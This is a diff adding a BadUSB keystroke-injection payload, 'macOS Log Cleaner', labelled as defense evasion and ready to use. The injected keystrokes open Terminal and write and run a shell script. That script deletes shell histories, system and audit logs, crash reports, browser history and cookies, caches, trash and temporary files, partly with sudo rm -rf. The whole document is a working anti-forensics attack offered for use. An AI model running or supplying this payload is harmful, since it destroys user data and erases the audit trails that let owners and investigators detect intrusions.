@@ -1,0 +1,80 @@
+REM Title: macOS Log Cleaner
+REM Author: BadUSB Library
+REM Description: Cleans system logs and history to avoid detection
+REM Target: macOS 10.15+
+REM Category: Defense Evasion
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Create log cleaner script
+STRING cat > /tmp/log_cleaner.sh << 'EOF'
+#!/bin/bash
+
+echo "Cleaning macOS logs and history..."
+
+# Clear bash history
+history -c
+rm -f ~/.bash_history
+rm -f ~/.zsh_history
+
+# Clear system logs
+sudo rm -rf /var/log/*
+sudo rm -rf /private/var/log/*
+
+# Clear user logs
+rm -rf ~/Library/Logs/*
+rm -rf ~/Library/Caches/*
+
+# Clear browser data
+rm -rf ~/Library/Application\ Support/Google/Chrome/Default/History*
+rm -rf ~/Library/Application\ Support/Google/Chrome/Default/Cookies*
+rm -rf ~/Library/Safari/History*
+rm -rf ~/Library/Safari/Cookies*
+
+# Clear recent items
+rm -rf ~/Library/Application\ Support/com.apple.sharedfilelist/*
+
+# Clear trash
+rm -rf ~/.Trash/*
+
+# Clear temporary files
+rm -rf /tmp/*
+rm -rf /var/tmp/*
+
+# Clear system caches
+sudo rm -rf /System/Library/Caches/*
+sudo rm -rf /Library/Caches/*
+
+# Clear network logs
+sudo rm -rf /var/log/asl/*
+
+# Clear audit logs
+sudo rm -rf /var/audit/*
+
+# Clear crash reports
+rm -rf ~/Library/Logs/DiagnosticReports/*
+sudo rm -rf /Library/Logs/DiagnosticReports/*
+
+echo "Log cleaning completed"
+
+EOF
+ENTER
+
+REM Make executable and run
+STRING chmod +x /tmp/log_cleaner.sh
+ENTER
+STRING /tmp/log_cleaner.sh
+ENTER
+
+REM Also clear current session
+STRING history -c
+ENTER
+STRING clear
+ENTER
